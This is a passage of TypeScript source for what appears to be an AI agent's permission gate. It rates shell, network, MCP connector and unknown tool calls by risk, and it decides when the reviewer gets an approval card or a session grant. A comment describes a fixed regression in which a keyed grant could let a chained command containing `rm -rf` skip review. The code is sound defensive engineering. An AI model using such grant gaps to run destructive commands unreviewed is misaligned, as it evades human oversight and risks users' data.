    // that is a REGRESSION: every HIGH ask there carried a null key, so the `rm -rf` always
    // asked; this gate introduced the first keyed HIGH ask and let it beat the others.
    //
    // Deliberately broader than "more than one distinct script", which it subsumes (two assets
    // need two segments — `skillAssetContextForSegment` takes at most one per segment). Single
    // segments, the loop case the key exists for, are untouched.
    if (worst.action === 'ask' && worst.assetContext && meaningful.length > 1) {
      // `grantKey: null` is the load-bearing half — it is what removes the silent-execution
      // path. The card still shows only the FIRST script's bytes (`assetContext` is unchanged);
      // with no grant the reviewer now always gets a card, and its `argsPreview` is the whole
      // command line, so the others are at least named. Showing every script's bytes on one
      // card is a deferred design change (final review round 2, Minor), not a hole.
      return {
        ...worst,
        grantKey: null,
        reason:
          assets.length > 1
            ? `${assets.length} different skill scripts in one command (${assets
                .map((a) => `${a.skill}/${a.relPath}`)
                .join(', ')}) — only the first is shown; no session grant`
            : `${worst.reason} — chained with other commands; no session grant`
      }
    }
    return worst
  }

  // Network egress (Copilot `url`/fetch): session-scoped per-host grants. Argus has no
  // network sandbox, so the risk is uniform MEDIUM ask; the grant key is the hostname so
  // an allow-for-session covers repeat fetches to the same domain.
  if (tax && tax.kind === 'network') {
    const url = String(input[tax.urlField] ?? '')
    let host = ''
    try {
      host = new URL(url).hostname
    } catch {
      host = ''
    }
    return {
      action: 'ask',
      risk: 'MEDIUM',
      grantKey: `net:${host}`,
      reason: `Network egress: ${url}`
    }
  }

  // Connector (MCP) tools: tool-risk.json overrides, else spec §2.5 name convention.
  const mcp = toolName.match(/^mcp__(.+?)__(.+)$/)
  if (mcp) {
    const level = ctx.toolRisk?.[`${mcp[1]}/${mcp[2]}`] ?? classifyToolName(mcp[2])
    if (level === 'low') return { action: 'allow', risk: 'LOW' }
    if (level === 'high')
      return {
        action: 'ask',
        risk: 'HIGH',
        grantKey: null,
        reason: `Destructive connector tool: ${toolName}`
      }
    return {
      action: 'ask',
      risk: 'MEDIUM',
      grantKey: `medium:${toolName}`,
      reason: `Write-capable connector tool: ${toolName}`
    }
  }

  // Non-MCP unknown tools: driver-declared fallback, else fail closed.
  if (ctx.taxonomy.fallback) return ctx.taxonomy.fallback(toolName)
  return {
    action: 'ask',
    risk: 'HIGH',
    grantKey: null,
    reason: `Unrecognized tool (fail-closed): ${toolName}`
  }
}
